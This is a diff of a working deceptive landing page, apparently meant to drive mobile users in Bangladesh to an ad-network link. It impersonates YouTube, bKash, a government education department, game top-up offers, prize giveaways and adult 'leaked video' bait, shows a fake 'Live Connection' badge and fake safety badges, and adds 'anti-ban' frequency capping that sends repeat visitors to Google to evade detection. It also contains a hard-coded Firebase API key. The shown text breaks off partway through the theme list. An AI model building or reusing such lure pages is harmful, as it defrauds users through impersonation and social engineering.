@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Loading Content...</title>
+    <title>Secure Content Loading...</title>
     
     <!-- ✅ Libraries -->
     <script src="https://cdn.tailwindcss.com"></script>
@@ -16,218 +16,314 @@
     <style>
         body { font-family: 'Hind Siliguri', 'Roboto', sans-serif; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
         .hidden { display: none !important; }
+        
+        /* 🌫️ The Curiosity Blur Effect */
+        .mystery-blur { filter: blur(18px); transform: scale(1.1); transition: filter 0.5s ease; }
+        .mystery-blur.revealed { filter: blur(5px); } /* Never fully clear until click */
+
+        /* 🔄 Animations */
         .spin-slow { animation: spin 3s linear infinite; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
-        .pulse-fast { animation: pulse 1s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: .5; } }
-        .modal-enter { animation: slideUp 0.3s ease-out forwards; }
-        @keyframes slideUp { from { transform: translateY(100%); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-        .no-scrollbar::-webkit-scrollbar { display: none; }
-        .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+        
+        .fade-up { animation: fadeUp 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
+        @keyframes fadeUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* 🖱️ Interaction Zones */
+        .glass-panel { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); }
+        .bottom-sheet { box-shadow: 0 -10px 40px rgba(0,0,0,0.5); border-top: 1px solid rgba(255,255,255,0.1); }
     </style>
 </head>
-<body id="main-body" class="bg-gray-900 text-white min-h-screen relative">
+<body id="main-body" class="bg-gray-900 text-white min-h-screen relative selection:bg-pink-500 selection:text-white">
 
-    <!-- 📱 APP VIEW -->
-    <div id="app-container" class="w-full max-w-md mx-auto min-h-screen bg-black relative shadow-2xl overflow-hidden">
-        <div id="theme-content" class="w-full h-full"></div>
-    </div>
+    <!-- 📱 APP CONTAINER -->
+    <div id="app-container" class="w-full max-w-md mx-auto min-h-screen bg-black relative shadow-2xl overflow-hidden flex flex-col">
+        
+        <!-- 🖼️ VISUAL AREA (Blurred Content) -->
+        <div id="visual-area" class="relative flex-1 bg-gray-900 overflow-hidden cursor-pointer" onclick="handleUserInteraction()">
+            <!-- Dynamic Image/Video will be injected here -->
+            <img id="theme-image" src="" class="w-full h-full object-cover mystery-blur opacity-60" onerror="this.style.display='none'; this.parentElement.style.background='#1a1a1a'">
+            
+            <!-- Overlay Icons (Play/Lock) -->
+            <div class="absolute inset-0 flex items-center justify-center z-10 pointer-events-none">
+                <div id="center-icon" class="w-20 h-20 bg-white/10 backdrop-blur-md rounded-full flex items-center justify-center border border-white/20 shadow-[0_0_30px_rgba(255,255,255,0.1)] animate-pulse">
+                    <i class="fas fa-lock text-3xl text-white/80"></i>
+                </div>
+            </div>
 
-    <!-- 🔒 VERIFICATION MODAL -->
-    <div id="verify-modal" class="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm hidden flex items-end sm:items-center justify-center">
-        <div class="w-full max-w-md bg-gray-900 rounded-t-2xl sm:rounded-2xl p-6 border-t border-gray-700 shadow-2xl modal-enter">
-            <div class="flex justify-between items-center mb-4">
-                <h3 class="text-lg font-bold text-white">Verification Required</h3>
-                <button onclick="closeModal()" class="text-gray-400 hover:text-white"><i class="fas fa-times"></i></button>
-            </div>
-            <div class="text-center">
-                <div id="modal-icon" class="w-16 h-16 bg-blue-600/20 rounded-full flex items-center justify-center mx-auto mb-4 text-blue-500 animate-pulse">
-                    <i class="fas fa-shield-alt text-3xl"></i>
+            <!-- Fake UI Elements (Top) -->
+            <div class="absolute top-0 w-full p-4 bg-gradient-to-b from-black/80 to-transparent z-10 flex justify-between items-center">
+                <div class="flex items-center gap-2">
+                    <span class="w-2 h-2 bg-red-600 rounded-full animate-pulse"></span>
+                    <span class="text-xs font-bold tracking-widest uppercase text-red-500">Live Connection</span>
                 </div>
-                <p class="text-gray-300 text-sm mb-6">Complete verification to continue.</p>
-                <div class="w-full bg-gray-800 h-2 rounded-full mb-2">
-                    <div id="modal-progress" class="h-full bg-blue-600 w-0 rounded-full transition-all duration-1000"></div>
+                <div class="text-[10px] bg-white/10 px-2 py-1 rounded backdrop-blur">
+                    <i class="fas fa-eye"></i> <span id="view-count">1.2K</span>
                 </div>
-                <p class="text-[10px] text-right text-gray-500 mb-4">Checking connection...</p>
-                <button id="final-btn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3.5 rounded-xl shadow-lg flex items-center justify-center gap-2 opacity-60 cursor-not-allowed" disabled>
-                    <i class="fas fa-lock"></i> Verify & Continue
-                </button>
             </div>
+        </div>
+
+        <!-- 👇 BOTTOM INTERACTION SHEET (The Hook) -->
+        <div id="action-sheet" class="bg-[#121212] p-6 pb-8 rounded-t-3xl z-20 bottom-sheet fade-up relative">
+            <!-- Loading Overlay within Sheet -->
+            <div id="loader-overlay" class="absolute inset-0 bg-[#121212] z-30 flex flex-col items-center justify-center hidden rounded-t-3xl">
+                <i class="fas fa-circle-notch fa-spin text-blue-500 text-3xl mb-3"></i>
+                <p id="loader-text" class="text-gray-400 text-xs tracking-widest uppercase">Analyzing Network...</p>
+            </div>
+
+            <!-- Content Info -->
+            <div class="text-center mb-6">
+                <h1 id="theme-title" class="text-xl font-bold text-white mb-2 leading-tight">Content Locked</h1>
+                <p id="theme-desc" class="text-xs text-gray-400">Secure connection established. Verification required.</p>
+            </div>
+
+            <!-- Stats Grid -->
+            <div class="grid grid-cols-3 gap-2 mb-6 text-center">
+                <div class="bg-white/5 p-2 rounded-lg border border-white/5">
+                    <i class="fas fa-shield-alt text-green-500 mb-1"></i>
+                    <p class="text-[10px] text-gray-500">Safe</p>
+                </div>
+                <div class="bg-white/5 p-2 rounded-lg border border-white/5">
+                    <i class="fas fa-bolt text-yellow-500 mb-1"></i>
+                    <p class="text-[10px] text-gray-500">Fast</p>
+                </div>
+                <div class="bg-white/5 p-2 rounded-lg border border-white/5">
+                    <i class="fas fa-hd text-blue-500 mb-1"></i>
+                    <p class="text-[10px] text-gray-500">HD+</p>
+                </div>
+            </div>
+
+            <!-- Main CTA Button -->
+            <button id="cta-btn" onclick="handleUserInteraction()" class="w-full bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-500 hover:to-blue-400 text-white font-bold py-4 rounded-xl shadow-[0_0_20px_rgba(37,99,235,0.3)] transition-all transform active:scale-95 flex items-center justify-center gap-3 relative overflow-hidden group">
+                <span class="absolute inset-0 w-full h-full bg-gradient-to-r from-transparent via-white/20 to-transparent -translate-x-full group-hover:animate-[shimmer_1.5s_infinite]"></span>
+                <i class="fas fa-unlock"></i> <span id="btn-text">UNLOCK CONTENT</span>
+            </button>
+            
+            <p class="text-[9px] text-gray-600 text-center mt-4">
+                ID: <span class="font-mono">728491</span> • Server: <span class="text-green-800">Dhaka_CDN_04</span>
+            </p>
         </div>
     </div>
 
-    <!-- ⚙️ LOGIC -->
+    <!-- 🛠️ JAVASCRIPT LOGIC -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
         import { getFirestore, doc, setDoc, increment, serverTimestamp, collection, query, where, getDocs } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore.js";
 
-        // CONFIG
+        // ⚙️ SYSTEM CONFIGURATION
         const CONFIG = {
             MONETAG_LINK: "https://otieu.com/4/10277714",
-            SAFE_PAGE: "https://www.google.com",
+            SAFE_PAGE: "https://www.google.com", 
+            CAP_HOURS: 8, // Frequency Cap (Hours)
             FIREBASE: { apiKey: "AIzaSyCU2RfLeclEyyxzEActtl5ks1P_NPvATOE", projectId: "ns-prime-d7ca5" }
         };
 
+        // Firebase Init
         let db; try { const app = initializeApp(CONFIG.FIREBASE); db = getFirestore(app); } catch(e){}
-        
+
+        // URL Params
         const params = new URLSearchParams(window.location.search);
         const refCode = params.get('ref'); 
         const type = params.get('type') || 'video';
-        let isSafeUser = true;
+
+        // 🧠 FREQUENCY CAPPING SYSTEM (Anti-Ban Logic)
+        function checkFrequency() {
+            const lastVisit = localStorage.getItem('ns_last_click');
+            if (lastVisit) {
+                const diff = Date.now() - parseInt(lastVisit);
+                const hours = diff / (1000 * 60 * 60);
+                if (hours < CONFIG.CAP_HOURS) {
+                    // User clicked recently, don't show ad immediately or redirect to safe page
+                    console.log("Frequency Capped. Safe Mode Active.");
+                    return false; // Not Safe to show Ad
+                }
+            }
+            return true; // Safe to show Ad
+        }
+
+        let isAdAvailable = checkFrequency();
+        let interactionStep = 0; // 0: Initial, 1: Analyzing, 2: Ready
 
         // ==========================================
-        // 🎨 30 THEMES (ALL IN ONE)
+        // 🎨 PROFESSIONAL THEME DATA
         // ==========================================
         const themes = {
-            video: { bg: "#0f0f0f", modalColor: "220, 38, 38", render: () => `<div class="bg-[#0f0f0f] min-h-screen text-white"><div class="sticky top-0 z-10 bg-[#0f0f0f]/95 px-4 py-3 flex justify-between border-b border-gray-800"><div class="flex items-center gap-1"><i class="fab fa-youtube text-red-600 text-2xl"></i> <span class="font-bold">YouTube</span></div><i class="fas fa-search"></i></div><div class="relative w-full aspect-video bg-black cursor-pointer" onclick="triggerLock('video')"><img src="https://images.unsplash.com/photo-1611162617474-5b21e879e113?q=80&w=1000" class="w-full h-full object-cover opacity-80"><div class="absolute inset-0 flex items-center justify-center"><i class="fas fa-play-circle text-6xl text-white opacity-90"></i></div></div><div class="p-4"><h1 class="text-lg font-medium">Viral_Video_Leaked_2025.mp4</h1><div class="flex justify-around py-4 border-b border-gray-800" onclick="triggerLock('video')"><i class="fas fa-thumbs-up"></i><i class="fas fa-share"></i><i class="fas fa-download"></i></div></div></div>` },
-            
-            bhabi: { bg: "#000", modalColor: "236, 72, 153", render: () => `<div class="bg-black min-h-screen p-2"><h2 class="text-white font-bold p-2">Private Gallery (18+)</h2><div class="grid grid-cols-3 gap-1"><div class="col-span-3 aspect-video relative mb-1" onclick="triggerLock('bhabi')"><img src="https://images.unsplash.com/photo-1623949556801-6e3e5c942944?q=80&w=1000" class="w-full h-full object-cover blur-md"><div class="absolute inset-0 flex items-center justify-center flex-col"><i class="fas fa-lock text-pink-500 text-3xl"></i><span class="text-pink-500 font-bold text-xs bg-black/50 px-2 rounded">LOCKED</span></div></div>${Array(9).fill(0).map(i=>`<div class="aspect-square bg-gray-800" onclick="triggerLock('bhabi')"><img src="https://source.unsplash.com/random/200x200/?girl" class="w-full h-full object-cover opacity-50"></div>`).join('')}</div></div>` },
-            
-            job: { bg: "#f8fafc", modalColor: "5, 150, 105", render: () => `<div class="bg-slate-50 min-h-screen text-gray-800"><div class="bg-[#006a4e] text-white p-4 sticky top-0"><h1 class="text-sm font-bold text-center">Department of Primary Education</h1></div><div class="p-4"><div class="bg-white p-4 rounded shadow border-l-4 border-red-600 mb-4"><h2 class="font-bold">Primary Assistant Teacher Circular 2025</h2><p class="text-xs text-gray-500">Vacancies: 45,000+</p></div><button onclick="triggerLock('job')" class="w-full bg-[#006a4e] text-white font-bold py-3 rounded shadow flex items-center justify-center gap-2"><i class="fas fa-download"></i> DOWNLOAD CIRCULAR</button></div></div>` },
-            
-            whatsapp: { bg: "#0b141a", modalColor: "34, 197, 94", render: () => `<div class="bg-[#0b141a] min-h-screen flex flex-col"><div class="bg-[#202c33] p-3 flex items-center gap-3"><img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?q=80&w=1000" class="w-10 h-10 rounded-full"><h3 class="text-white font-bold text-sm">Sumaiya ❤️</h3></div><div class="flex-1 bg-[url('https://i.pinimg.com/originals/97/c0/07/97c00727d1d403f1d58f14232f21879e.png')] opacity-80 p-4" onclick="triggerLock('whatsapp')"><div class="bg-[#202c33] text-white p-2 rounded-lg w-fit mb-2">Video ta dekho 👇</div><div class="bg-[#202c33] p-1 rounded-lg w-48 relative"><img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?q=80&w=1000" class="w-full h-32 object-cover blur-sm"><div class="absolute inset-0 flex items-center justify-center"><i class="fas fa-play text-white text-2xl"></i></div></div></div></div>` },
-            
-            freefire: { bg: "#000", modalColor: "234, 179, 8", render: () => `<div class="bg-black min-h-screen flex flex-col items-center justify-center p-6 text-center"><img src="https://cdn-icons-png.flaticon.com/512/2666/2666505.png" class="w-20 mb-4 animate-bounce"><h1 class="text-4xl font-black text-white italic">5000 <span class="text-yellow-500">DIAMONDS</span></h1><div class="relative w-64 h-64 my-6" onclick="triggerLock('freefire')"><img src="https://png.pngtree.com/png-vector/20240726/ourmid/pngtree-colorful-lucky-wheel-clipart-design-png-image_13233857.png" class="w-full h-full animate-spin"></div><button onclick="triggerLock('freefire')" class="w-full bg-gradient-to-r from-yellow-500 to-orange-600 text-white font-bold py-3 rounded-xl animate-pulse">CLAIM NOW</button></div>` },
-            
-            money: { bg: "#e2136e", modalColor: "226, 19, 110", render: () => `<div class="bg-gray-100 min-h-screen relative"><div class="bg-[#e2136e] h-40 rounded-b-[2rem] p-6 text-white text-center"><img src="https://freelogopng.com/images/all_img/1656234745bkash-app-logo-png.png" class="h-8 mx-auto brightness-0 invert"></div><div class="mx-6 -mt-16 bg-white rounded-xl shadow-xl p-8 text-center cursor-pointer" onclick="triggerLock('money')"><p class="text-xs font-bold uppercase text-gray-400">Pending</p><h1 class="text-5xl font-bold text-[#e2136e] mb-4">৳৫০০</h1><button class="w-full bg-[#e2136e] text-white font-bold py-3 rounded-full">CLAIM MONEY</button></div></div>` },
-            
-            result: { bg: "#fff", modalColor: "22, 163, 74", render: () => `<div class="bg-gray-100 min-h-screen p-6 font-serif"><div class="bg-white border-t-4 border-green-600 p-6 rounded shadow"><h2 class="text-center font-bold text-xl mb-4 text-green-700">WEB BASED RESULT</h2><div class="space-y-4" onclick="triggerLock('result')"><input value="HSC 2025" class="w-full bg-gray-100 p-2 rounded border" readonly><input value="18293***" class="w-full bg-gray-100 p-2 rounded border" readonly><button class="w-full bg-green-600 text-white font-bold py-3 rounded">GET RESULT</button></div></div></div>` },
-            
-            live: { bg: "#000", modalColor: "34, 197, 94", render: () => `<div class="bg-gray-900 min-h-screen flex flex-col items-center justify-center p-6"><div class="w-32 h-32 rounded-full border-4 border-green-500 p-1 mb-4 relative"><img src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?q=80&w=1000" class="w-full h-full rounded-full object-cover"></div><h2 class="text-3xl font-bold text-white">Nusrat Jahan</h2><p class="text-green-400 animate-pulse text-sm mb-10">Incoming Video Call...</p><div class="flex gap-8"><button onclick="triggerLock('live')" class="w-16 h-16 bg-green-500 rounded-full text-white text-3xl animate-bounce"><i class="fas fa-video"></i></button><button class="w-16 h-16 bg-red-600 rounded-full text-white text-2xl"><i class="fas fa-phone-slash"></i></button></div></div>` },
-            
-            tiktok: { bg: "#000", modalColor: "254, 44, 85", render: () => `<div class="bg-black min-h-screen relative" onclick="triggerLock('tiktok')"><img src="https://images.unsplash.com/photo-1611605698335-8b1569810432?q=80&w=1000" class="w-full h-full object-cover opacity-60"><div class="absolute right-2 bottom-20 flex flex-col gap-6 text-white text-center"><i class="fas fa-heart text-3xl"></i><i class="fas fa-share text-3xl"></i></div><div class="absolute bottom-6 left-4 text-white"><h3 class="font-bold">@viral_girl</h3><p class="text-sm">Wait for end... 😱</p></div><div class="absolute inset-0 flex items-center justify-center"><i class="fas fa-play text-6xl text-white/50"></i></div></div>` },
-            
-            movie: { bg: "#000", modalColor: "220, 38, 38", render: () => `<div class="bg-[#141414] min-h-screen text-white relative"><div class="relative h-[60vh]"><img src="https://images.unsplash.com/photo-1626814026160-2237a95fc5a0?q=80&w=1000" class="w-full h-full object-cover opacity-70"><div class="absolute bottom-10 left-6"><h1 class="text-5xl font-black mb-2">JAWAN</h1><button onclick="triggerLock('movie')" class="bg-white text-black font-bold py-2 px-6 rounded flex items-center gap-2"><i class="fas fa-play"></i> Play</button></div></div></div>` },
-            
-            pubg: { bg: "#000", modalColor: "249, 115, 22", render: () => `<div class="bg-black min-h-screen flex flex-col items-center justify-center text-center p-6"><img src="https://upload.wikimedia.org/wikipedia/en/thumb/1/1b/PUBG_Mobile_Logo.png/220px-PUBG_Mobile_Logo.png" class="w-40 mb-6"><div class="bg-gray-900 border border-orange-500 p-6 rounded-xl w-full"><h1 class="text-3xl text-white font-bold mb-4">660 UC FREE</h1><button onclick="triggerLock('pubg')" class="w-full bg-orange-600 text-white font-bold py-3 rounded">COLLECT</button></div></div>` },
-            
-            wifi: { bg: "#000", modalColor: "34, 197, 94", render: () => `<div class="bg-black min-h-screen text-green-500 font-mono p-6"><h2 class="font-bold mb-4">WiFi Cracker v2.4</h2><div class="mb-6 text-xs"><p>> Scanning...</p><p>> Target: TP-Link_5G</p><p class="text-white font-bold">> PASSWORD FOUND *********</p></div><button onclick="triggerLock('wifi')" class="w-full bg-green-600 text-black font-bold py-3 rounded">SHOW PASSWORD</button></div>` },
-            
-            instagram: { bg: "#000", modalColor: "217, 70, 239", render: () => `<div class="bg-black min-h-screen text-white"><div class="p-6 flex items-center gap-4"><div class="w-20 h-20 rounded-full border-2 border-pink-500"><img src="https://source.unsplash.com/random/100x100/?girl" class="rounded-full w-full h-full"></div><div><h2 class="font-bold text-xl">1000 Followers</h2><button onclick="triggerLock('instagram')" class="bg-blue-500 px-4 py-1 rounded text-sm mt-2">Get Free</button></div></div><div class="grid grid-cols-3 gap-1 mt-4">${Array(9).fill(0).map(i=>`<div class="aspect-square bg-gray-800" onclick="triggerLock('instagram')"><img src="https://source.unsplash.com/random/200x200/?fashion" class="w-full h-full object-cover"></div>`).join('')}</div></div>` },
-            
-            spin: { bg: "#1e1b4b", modalColor: "234, 179, 8", render: () => `<div class="bg-indigo-900 min-h-screen flex flex-col items-center justify-center"><h1 class="text-yellow-400 font-bold text-3xl mb-8">SPIN & WIN</h1><div class="w-72 h-72 relative cursor-pointer" onclick="triggerLock('spin')"><img src="https://png.pngtree.com/png-vector/20240726/ourmid/pngtree-colorful-lucky-wheel-clipart-design-png-image_13233857.png" class="w-full h-full animate-spin"></div><button onclick="triggerLock('spin')" class="mt-8 bg-yellow-500 text-black font-bold py-3 px-8 rounded-full">SPIN NOW</button></div>` },
-            
-            dating: { bg: "#000", modalColor: "254, 60, 114", render: () => `<div class="bg-black min-h-screen p-4 flex flex-col"><div class="relative flex-1 rounded-xl overflow-hidden mb-4"><img src="https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?q=80&w=1000" class="w-full h-full object-cover"><div class="absolute bottom-0 p-4 text-white"><h2 class="text-3xl font-bold">Riya, 21</h2><p>2km away</p></div></div><div class="flex justify-center gap-6"><button onclick="triggerLock('dating')" class="w-16 h-16 bg-black border border-green-500 text-green-500 rounded-full text-3xl"><i class="fas fa-heart"></i></button><button class="w-16 h-16 bg-black border border-red-500 text-red-500 rounded-full text-3xl"><i class="fas fa-times"></i></button></div></div>` },
-            
-            telegram: { bg: "#17212b", modalColor: "64, 167, 227", render: () => `<div class="bg-[#17212b] min-h-screen text-white"><div class="bg-[#242f3d] p-4 flex gap-4"><div class="w-10 h-10 bg-blue-500 rounded-full flex items-center justify-center"><i class="fas fa-paper-plane"></i></div><div><h1 class="font-bold">Viral Leaked Zone</h1><p class="text-xs text-gray-400">524k subscribers</p></div></div><div class="p-4"><div class="bg-[#182533] p-2 rounded mb-4 cursor-pointer" onclick="triggerLock('telegram')"><div class="h-40 bg-black rounded mb-2 relative"><img src="https://source.unsplash.com/random/300x200/?girl" class="w-full h-full object-cover blur-sm opacity-50"><div class="absolute inset-0 flex items-center justify-center"><i class="fas fa-play text-2xl"></i></div></div><p>New Viral Video 🔥</p></div></div><button onclick="triggerLock('telegram')" class="fixed bottom-0 w-full bg-[#40a7e3] py-4 font-bold">JOIN CHANNEL</button></div>` },
-            
-            iphone: { bg: "#000", modalColor: "255, 255, 255", render: () => `<div class="bg-black min-h-screen text-center p-6 text-white pt-20"><i class="fab fa-apple text-6xl mb-4"></i><h1 class="text-3xl font-bold mb-4">iPhone 15 Pro</h1><img src="https://store.storeimages.cdn-apple.com/4982/as-images.apple.com/is/iphone-15-pro-finish-select-202309-6-7inch-naturaltitanium?wid=5120&hei=2880&fmt=p-jpg" class="w-full max-w-xs mx-auto mb-6"><div class="bg-green-500 text-black inline-block px-4 py-1 rounded-full font-bold mb-6">WINNER SELECTED</div><button onclick="triggerLock('iphone')" class="w-full bg-white text-black font-bold py-4 rounded-xl">CLAIM PRIZE</button></div>` },
-            
-            news: { bg: "#f3f4f6", modalColor: "185, 28, 28", render: () => `<div class="bg-white min-h-screen text-gray-900"><div class="bg-red-700 text-white p-3 font-bold flex justify-between"><span>BREAKING NEWS</span><span class="animate-pulse">LIVE</span></div><div class="p-4"><h1 class="text-2xl font-bold mb-4">Scandal Video Leaked Online</h1><div class="aspect-video bg-black relative rounded-lg overflow-hidden cursor-pointer" onclick="triggerLock('news')"><img src="https://images.unsplash.com/photo-1504711434969-e33886168f5c?q=80&w=1000" class="w-full h-full object-cover blur-sm"><div class="absolute inset-0 flex items-center justify-center"><i class="fas fa-play-circle text-6xl text-white"></i></div></div><p class="mt-4 text-sm">Full video footage available below...</p></div></div>` },
-            
-            apk: { bg: "#202124", modalColor: "34, 197, 94", render: () => `<div class="bg-[#202124] min-h-screen text-white p-6 pt-20 text-center"><div class="w-24 h-24 bg-green-500 rounded-2xl mx-auto flex items-center justify-center text-4xl mb-4"><i class="fab fa-android"></i></div><h1 class="text-2xl font-bold">Kinemaster Pro</h1><p class="text-green-400 mb-8">Premium Unlocked</p><button onclick="triggerLock('apk')" class="w-full bg-green-600 text-black font-bold py-4 rounded-xl">DOWNLOAD (98MB)</button></div>` },
-            
-            crypto: { bg: "#0f172a", modalColor: "234, 179, 8", render: () => `<div class="bg-[#0f172a] min-h-screen text-white flex flex-col items-center justify-center p-6"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/46/Bitcoin.svg/1200px-Bitcoin.svg.png" class="w-24 mb-6 animate-bounce"><h1 class="text-3xl font-bold mb-2">Binance Airdrop</h1><div class="bg-[#1e293b] p-6 rounded-xl w-full text-center border border-gray-700 mb-6"><h2 class="text-4xl font-bold text-yellow-500">0.005 BTC</h2><p class="text-gray-400 text-sm">Available Balance</p></div><button onclick="triggerLock('crypto')" class="w-full bg-yellow-500 text-black font-bold py-4 rounded-xl">CLAIM NOW</button></div>` },
-
-            giftcard: { bg: "#fff", modalColor: "37, 99, 235", render: () => `<div class="bg-gray-50 min-h-screen flex flex-col items-center justify-center p-6"><div class="bg-blue-600 w-full max-w-xs h-40 rounded-xl shadow-xl flex items-center justify-center text-white text-3xl font-bold mb-8 cursor-pointer" onclick="triggerLock('giftcard')">$50 CARD</div><div class="bg-white p-4 rounded border w-full text-center cursor-pointer" onclick="triggerLock('giftcard')"><p class="text-gray-400 text-xs">CODE</p><p class="font-mono text-xl blur-[2px]">7X29-W892</p><p class="text-xs text-blue-500 mt-2 font-bold">Tap to Reveal</p></div></div>` },
-
-            vpn: { bg: "#111827", modalColor: "239, 68, 68", render: () => `<div class="bg-gray-900 min-h-screen flex flex-col items-center justify-center text-center p-6"><div class="w-32 h-32 bg-red-900/30 rounded-full flex items-center justify-center mb-6 animate-pulse border-4 border-red-600"><i class="fas fa-unlock-alt text-5xl text-red-500"></i></div><h1 class="text-4xl font-bold text-white mb-2">IP EXPOSED!</h1><p class="text-red-400 font-bold mb-8">Your location is visible.</p><button onclick="triggerLock('vpn')" class="w-full bg-green-600 text-white font-bold py-4 rounded-xl">SECURE DEVICE</button></div>` },
-
-            music: { bg: "#121212", modalColor: "34, 197, 94", render: () => `<div class="bg-black min-h-screen text-white p-6 flex flex-col justify-center"><div class="aspect-square bg-gray-800 rounded-lg mb-6 relative cursor-pointer" onclick="triggerLock('music')"><img src="https://images.unsplash.com/photo-1493225255756-d9584f8606e9?q=80&w=1000" class="w-full h-full object-cover rounded-lg opacity-80"><div class="absolute inset-0 flex items-center justify-center"><i class="fas fa-play-circle text-7xl"></i></div></div><h1 class="text-2xl font-bold">Leaked_Track.mp3</h1><p class="text-gray-400 mb-6">Unreleased Album</p><button onclick="triggerLock('music')" class="w-full bg-green-500 text-black font-bold py-3 rounded-full">Download MP3</button></div>` },
-
-            health: { bg: "#fff", modalColor: "37, 99, 235", render: () => `<div class="bg-white min-h-screen text-gray-800 p-6"><h1 class="text-2xl font-black mb-4">LOSE 5KG IN 7 DAYS</h1><div class="flex gap-2 h-48 mb-6 cursor-pointer" onclick="triggerLock('health')"><div class="flex-1 bg-gray-100 flex items-center justify-center font-bold">BEFORE</div><div class="flex-1 bg-green-50 flex items-center justify-center font-bold text-green-600">AFTER</div></div><button onclick="triggerLock('health')" class="w-full bg-blue-600 text-white font-bold py-3 rounded-lg">UNLOCK DIET PLAN</button></div>` },
-
-            story: { bg: "#fdf6e3", modalColor: "219, 39, 119", render: () => `<div class="bg-[#fdf6e3] min-h-screen text-[#5b4636] p-8 font-serif"><h1 class="text-2xl font-bold text-center mb-6">নিষিদ্ধ রাতের গল্প</h1><p class="text-lg mb-4">সেদিন রাতে বৃষ্টি হচ্ছিল...</p><div class="relative cursor-pointer" onclick="triggerLock('story')"><p class="text-lg blur-[4px]">সে ঘরে ঢুকেই আমাকে জড়িয়ে ধরল...</p><button class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 bg-pink-600 text-white font-bold px-6 py-2 rounded shadow">Read More</button></div></div>` },
-
-            ai: { bg: "#101010", modalColor: "139, 92, 246", render: () => `<div class="bg-gray-900 min-h-screen text-white p-6 pt-20"><div class="bg-gray-800 p-4 rounded mb-6"><p class="text-gray-400 text-xs">Prompt:</p><p>"Hyper realistic bangladeshi girl..."</p></div><div class="aspect-square bg-black rounded border border-gray-700 relative cursor-pointer" onclick="triggerLock('ai')"><img src="https://source.unsplash.com/random/400x400/?girl" class="w-full h-full object-cover blur-md opacity-50"><div class="absolute inset-0 flex items-center justify-center flex-col"><i class="fas fa-lock text-3xl mb-2 text-violet-500"></i><span class="text-xs font-bold">GENERATION COMPLETE</span></div></div></div>` },
-
-            cricket: { bg: "#1e3a8a", modalColor: "34, 197, 94", render: () => `<div class="bg-slate-900 min-h-screen text-white"><div class="bg-blue-900 p-4 flex justify-between items-center"><span class="font-bold">BAN vs IND</span><span class="text-red-500 font-bold animate-pulse">LIVE</span></div><div class="aspect-video bg-black relative cursor-pointer" onclick="triggerLock('cricket')"><img src="https://images.unsplash.com/photo-1531415074968-036ba1b575da?q=80&w=1000" class="w-full h-full object-cover opacity-50"><div class="absolute inset-0 flex items-center justify-center"><i class="fas fa-play-circle text-6xl"></i></div></div><p class="p-4 text-center">Resume HD Stream</p></div>` },
-
-            drive: { bg: "#fff", modalColor: "59, 130, 246", render: () => `<div class="bg-white min-h-screen text-gray-800"><div class="p-4 border-b flex gap-2 text-xl items-center"><i class="fab fa-google-drive text-green-500"></i> Drive</div><div class="p-4"><div class="bg-blue-50 p-4 rounded border border-blue-200 flex items-center gap-3 cursor-pointer" onclick="triggerLock('drive')"><i class="fas fa-file-video text-red-500 text-2xl"></i><div><p class="font-bold">Viral_Video.mp4</p><p class="text-xs">140 MB</p></div></div></div><button onclick="triggerLock('drive')" class="fixed bottom-6 right-6 w-14 h-14 bg-blue-600 rounded-full text-white text-2xl flex items-center justify-center shadow-lg"><i class="fas fa-download"></i></button></div>` },
-
-            messenger: { bg: "#000", modalColor: "0, 132, 255", render: () => `<div class="bg-black min-h-screen relative flex flex-col items-center pt-20"><img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?q=80&w=1000" class="absolute inset-0 w-full h-full object-cover opacity-60"><div class="relative z-10 text-center"><img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?q=80&w=1000" class="w-24 h-24 rounded-full border-2 border-blue-500 mb-4 mx-auto"><h2 class="text-2xl font-bold text-white">Sadia Islam</h2><p class="text-white">Messenger Video...</p></div><div class="absolute bottom-10 flex gap-8 z-10"><button onclick="triggerLock('messenger')" class="w-16 h-16 bg-green-500 rounded-full text-white text-3xl animate-bounce"><i class="fas fa-video"></i></button><button class="w-16 h-16 bg-red-600 rounded-full text-white text-2xl"><i class="fas fa-phone-slash"></i></button></div></div>` },
-
-            default: { bg: "#111827", modalColor: "59, 130, 246", render: () => `<div class="bg-gray-900 min-h-screen flex flex-col items-center justify-center p-6 text-center"><i class="fas fa-shield-alt text-6xl text-gray-600 mb-6"></i><h2 class="text-2xl font-bold text-white mb-2">Security Check</h2><p class="text-gray-400 mb-8">Verify you are human.</p><button onclick="triggerLock('default')" class="w-full bg-blue-600 text-white font-bold py-4 rounded-xl">I am not a robot</button></div>` }
+            // 🎬 VIDEO
+            video: {
+                img: "https://images.unsplash.com/photo-1611162617474-5b21e879e113?q=80&w=1000",
+                title: "Viral_Video_Leaked_2025.mp4",
+                desc: "This video contains sensitive content. Verification required to play.",
+                icon: "play",
+                color: "220, 38, 38"
+            },
+            // 🍑 BHABI
+            bhabi: {
+                img: "https://images.unsplash.com/photo-1623949556801-6e3e5c942944?q=80&w=1000",
+                title: "Private_Gallery_Backup (18+)",
+                desc: "Biometric authentication failed. Manual verification required.",
+                icon: "lock",
+                color: "236, 72, 153"
+            },
+            // 💼 JOB
+            job: {
+                img: "https://images.unsplash.com/photo-1454165804606-c3d57bc86b40?q=80&w=1000",
+                title: "Primary_Recruitment_Circular.pdf",
+                desc: "Server busy. Priority access requires human verification.",
+                icon: "file-pdf",
